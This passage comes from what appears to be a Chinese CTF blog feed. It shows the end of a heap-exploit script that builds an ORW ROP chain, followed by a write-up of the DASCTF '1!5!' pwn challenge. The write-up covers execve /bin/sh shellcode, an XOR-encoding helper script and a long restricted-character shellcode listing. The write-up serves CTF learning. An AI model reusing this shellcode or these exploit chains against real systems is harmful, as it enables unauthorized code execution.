rdx\nret&#x27;</span>)))<br>pop_rax = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>)))<br>syscall = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br>ret = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;ret&#x27;</span>)))<br>read=libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]+libc_base<br>write=libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]+libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pop_rdi))<br><br>edit(<span class="hljs-number">13</span>,change(<span class="hljs-number">0x67616c66</span>))<br>flag_addr=heap_base+<span class="hljs-number">0x800</span><br><br><br><span class="hljs-comment">#orw=change(pop_rax)+&#x27;01010000&#x27;+&#x27;0&#x27;*8*7+change(pop_rdi)+change(heap_base)+change(pop_rsi)+&#x27;00000000&#x27;+&#x27;00000010&#x27;+&#x27;0&#x27;*8*6+change(pop_rdx)+&#x27;11100000&#x27;+&#x27;0&#x27;*8*7+change(syscall)+change(heap_base+0x880)</span><br><span class="hljs-comment">#orw+=change(0x622fbf4856f63148)+&#x27;10010110&#x27;+&#x27;01110110&#x27;+&#x27;11110100&#x27;+&#x27;11110100&#x27;+&#x27;11001110&#x27;+&#x27;00010110&#x27;+&#x27;11101010&#x27;+&#x27;00101010&#x27;+&#x27;11111010&#x27;+&#x27;01010110&#x27;+&#x27;11011100&#x27;+&#x27;00011010&#x27;+&#x27;10011001&#x27;+&#x27;11110000&#x27;+&#x27;10100000&#x27;+&#x27;00000000&#x27;</span><br><br>orw=change(pop_rdi)+<span class="hljs-string">&#x27;11000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;00001000&#x27;</span>+<span class="hljs-string">&#x27;11100100&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">6</span>+change(syscall)<br>orw+=change(pop_rdi)+change(flag_addr)+change(pop_rsi)+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">8</span>+change(pop_rax)+<span class="hljs-string">&#x27;01000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;01000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;10100100&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;11000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;00000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;10000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(write)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">1</span>,orw)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">0xa0</span>+change(heap_base+<span class="hljs-number">0x820</span>+<span class="hljs-number">0x10</span>)+change(ret))<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/sandboxflag.png" alt="sandboxflag"></p><script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>ctf比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
      <tag>off by null</tag>
      
      <tag>IO_leak</tag>
      
      <tag>fastbin reverse into tcache</tag>
      
      <tag>orw</tag>
      
      <tag>ret2setconext</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF X GFCTF 2022十月挑战赛pwn</title>
    <link href="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>因为实在是太菜，所以一题都没做出来，跟着<a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247502987&amp;idx=1&amp;sn=39df1e5a1638db91f716f975fbeb69c1&amp;chksm=fbf456fbcc83dfedf587a21112de8e6fae17942e848974c5eafd827ab94af9d65aa87bef424b&amp;mpshare=1&amp;scene=23&amp;srcid=1025bRDnAZQ3o5bMtZAgFHMu&amp;sharer_sharetime=1666699678887&amp;sharer_shareid=600395608e88237687e56b1c66678009#rd">官方wp</a>复现一下</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/rank.png" alt="rank"></p><h2 id="1-5">1!5!</h2><h3 id="0x01-确定汇编">0x01 确定汇编</h3><p>题目限制输入指定明文字符15aABCDEFGHIJKLMNOPQRSUVWXYZ，且长度要刚好0x200</p><p>先确定能还用什么汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#\x31\x35\x61\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x55\x56\x57\x58\x59\x5A</span><br>push:<br>    \x50 P  push   rax<br>    \x51        Q             push   rcx<br>    \x52        R             push   rdx<br>    \x53        S             push   rbx<br>    \x55        U             push   rbp<br>    \x56        V             push   rsi<br>    \x57        W             push   rdi<br>    \x41\x50---&gt;\x41\x57  push r8---&gt;push r15<br>pop:<br>    \x58        X             pop    rax<br>    \x59        Y             pop    rcx<br>    \x5a        Z             pop    rdx<br>    \x41\x58AX    pop    r8<br>    \x41\x59AY  pop    r9<br>    \x41\x5aAZ  pop    r10<br>xor:<br>    \x35xxxx5XXXXxor    eax,xxxx<br>    \x31\x31 xor    DWORD PTR [rcx], esi<br>    <br>    \x31xy1xy(x决定两个寄存器，y决定立即数) <br>    xor    DWORD PTR [寄存器+立即数], 寄存器<br>    例：<br>    \x31\x61\x31xor    DWORD PTR [rcx+<span class="hljs-number">0x31</span>], esp<br>    \x31\x41\x35xor    DWORD PTR [rcx+<span class="hljs-number">0x35</span>], eax<br></code></pre></td></tr></table></figure><p><code>xor eax,xxxx</code>可以异或出小于0x7f的字节</p><p>（限制字符的范围小于0x5a，二进制最高位只能为0，异或同为零，所以最大只能造出0x7f即<code>01111111</code>）</p><p><code>xor DWORD PTR [寄存器+立即数], eax</code>可以把值写入指定位置</p><p>配合<code>push</code>，<code>pop</code>等命令加上残留在<code>rdx</code>寄存器上的<code>0x10000</code>地址，可以在<code>0x10000</code>往后的地址写入小于<code>0x7f</code>字节的值，去当作命令执行</p><p>我们可以使用小于0x7f的命令，即可用一些如<code>sub byte [rax+1],cl</code>这些命令，来造出大于<code>0x7f</code>的值</p><h3 id="0x02-小于0x7f指令，写入shellcode">0x02 小于0x7f指令，写入shellcode</h3><p>我们最终目的是写shellcode当作命令执行，</p><p>我这里找了个<code>64位 较短的shellcode  23字节</code></p><p><code>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</code></p><p>有三个字节大于0x7f</p><p>小于<code>0x7f</code>的字节就用小于0x7f的命令正常写入<code>0x10000+0x200</code>后的地址，大于0x7f的三个字节由<code>sub byte [rax+1],cl</code>来构造出，并写入指定位置。</p><p>可以写出由小于0x7f的指令组成的汇编：功能是把<code>shellcode</code>写到<code>0x10000+0x801</code>处</p><p>(<code>\x00</code>会影响解析汇编，所以微调下位置<code>0x801</code>,push的立即数要反着填)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add ax,0x801<br>push 0x56003148<br>pop rcx<br>xor DWORD PTR [rax], ecx<br>push 0x622f0048<br>pop rcx<br>xor DWORD PTR [rax+0x4], ecx<br>push 0x2f2f6e69<br>pop rcx<br>xor DWORD PTR [rax+0x8], ecx<br>push 0x54576873<br>pop rcx<br>xor DWORD PTR [rax+0xc], ecx<br>push 0x583b6a5f<br>pop rcx<br>xor DWORD PTR [rax+0x10], ecx<br>push 0x050f00<br>pop rcx<br>xor DWORD PTR [rax+0x14], ecx<br>push 0xa<br>pop rcx<br>sub byte [rax+1],cl<br>push 0x41<br>pop rcx<br>sub byte [rax+4],cl<br>push 0x67<br>pop rcx<br>sub byte [rax+19],cl<br>sub ax,0x801<br></code></pre></td></tr></table></figure><h3 id="0x03-异或出小于0x7f">0x03 异或出小于0x7f</h3><p>上面这串汇编对应值为</p><p><code>\x66\x05\x01\x08\x68\x48\x31\x00\x56\x59\x31\x08\x68\x48\x00\x2F\x62\x59\x31\x48\x04\x68\x69\x6E\x2F\x2F\x59\x31\x48\x08\x68\x73\x68\x57\x54\x59\x31\x48\x0C\x68\x5F\x6A\x3B\x58\x59\x31\x48\x10\x68\x00\x0F\x05\x00\x59\x31\x48\x14\x6A\x0A\x59\x28\x48\x02\x6A\x41\x59\x28\x48\x05\x6A\x67\x59\x28\x48\x14\x66\x2D\x01\x08</code></p><p>我们用最初的xor指令来异或出，并写入<code>0x10000+0x400</code>处</p><p>照着官方wp的小程序，来计算一下异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python">table=[<span class="hljs-number">0x31</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0x4B</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0x4E</span>,<span class="hljs-number">0x4F</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x5A</span>]<br>table2=&#123;&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>():   <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> table:<br>            k=i^j<br>            <span class="hljs-keyword">if</span> k <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(table2.keys()):<br>                table2[k]=(i,j)<br>xor()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table2.keys():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i),end=<span class="hljs-string">&#x27;,&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> table2.keys():<br>        <span class="hljs-keyword">return</span> (table2[n])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find1</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table:<br>        j=i^n<br>        <span class="hljs-keyword">if</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(table2.keys()):<br>            <span class="hljs-keyword">return</span>(i,table2[j][<span class="hljs-number">0</span>],table2[j][<span class="hljs-number">1</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_num</span>(<span class="hljs-params">n</span>):<br>    num1=(n)&amp;<span class="hljs-number">0xff</span><br>    num2=(n&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>    num3=(n&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>    num4=(n&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span><br>    n1=find(num1)<br>    n2=find(num2)<br>    n3=find(num3)<br>    n4=find(num4)<br>    <span class="hljs-keyword">if</span> n1!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n2!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n3!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n4!=<span class="hljs-literal">None</span> :<br>        ret1=n1[<span class="hljs-number">0</span>]+(n2[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        ret2=n1[<span class="hljs-number">1</span>]+(n2[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret2))<br>        <span class="hljs-keyword">return</span><br>    num1=(n)&amp;<span class="hljs-number">0xff</span><br>    num2=(n&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>    num3=(n&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>    num4=(n&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span><br>    n1=find1(num1)<br>    n2=find1(num2)<br>    n3=find1(num3)<br>    n4=find1(num4)<br>    <span class="hljs-keyword">if</span> n1!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n2!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n3!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n4!=<span class="hljs-literal">None</span> :<br>        ret1=n1[<span class="hljs-number">0</span>]+(n2[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        ret2=n1[<span class="hljs-number">1</span>]+(n2[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        ret3=n1[<span class="hljs-number">2</span>]+(n2[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret2))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret3))<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;not found&#x27;</span>)<br>xor_num(<span class="hljs-number">0x10440</span>^<span class="hljs-number">0x10000</span>)<br>p2=[<span class="hljs-number">0x66</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x5F</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x00</span>]<br>a=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(p2),<span class="hljs-number">4</span>):<br>    num=p2[i]+(p2[i+<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+(p2[i+<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">16</span>)+(p2[i+<span class="hljs-number">3</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(num))<br>    xor_num(a^num)<br>    a=num<br><br></code></pre></td></tr></table></figure><p>最后造出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push rdx<br>pop rax<br>xor eax,0x31313131<br>xor eax,0x31313531<br>push rax<br>pop rcx<br>xor eax,0x31423131<br>xor eax,0x31433531<br><br>xor eax,0x41424131<br>xor eax,0x49434457<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313135<br>xor eax,0x61423161<br>xor eax,0x58434d5a<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x31313131<br>xor eax,0x61616141<br>xor eax,0x5850414e<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x31313131<br>xor eax,0x41316141<br>xor eax,0x5731414e<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rax<br>push rcx<br>pop rax<br>xor eax,0x31313141<br>xor eax,0x31313151<br>push rax<br>pop rcx<br>pop rax<br><br>xor eax,0x31614141<br>xor eax,0x5650504b<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313161<br>xor eax,0x41313141<br>xor eax,0x56583146<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x41313131<br>xor eax,0x44423142<br>xor eax,0x5a434758<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x31313161<br>xor eax,0x31314141<br>xor eax,0x42315747<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rax<br>push rcx<br>pop rax<br>xor eax,0x31313161<br>xor eax,0x31313151<br>push rax<br>pop rcx<br>pop rax<br><br>xor eax,0x31314131<br>xor eax,0x41414441<br>xor eax,0x5a4c5a50<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313131<br>xor eax,0x31316131<br>xor eax,0x31584f59<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x31313161<br>xor eax,0x42414141<br>xor eax,0x4347524e<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x31614131<br>xor eax,0x31414261<br>xor eax,0x48535856<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rax<br>push rcx<br>pop rax<br>xor eax,0x31313141<br>xor eax,0x31313151<br>push rax<br>pop rcx<br>pop rax<br><br>xor eax,0x31313131<br>xor eax,0x61313131<br>xor eax,0x45473131<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313161<br>xor eax,0x31413141<br>xor eax,0x4d4e5948<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x41616141<br>xor eax,0x505a5255<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x31313131<br>xor eax,0x41614141<br>xor eax,0x4358524c<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rax<br>push rcx<br>pop rax<br>xor eax,0x31313131<br>xor eax,0x31313141<br>push rax<br>pop rcx<br>pop rax<br><br>xor eax,0x61614131<br>xor eax,0x434b5058<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313131<br>xor eax,0x61314131<br>xor eax,0x414f4344<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x31613131<br>xor eax,0x41414144<br>xor eax,0x4f535258<br>xor DWORD 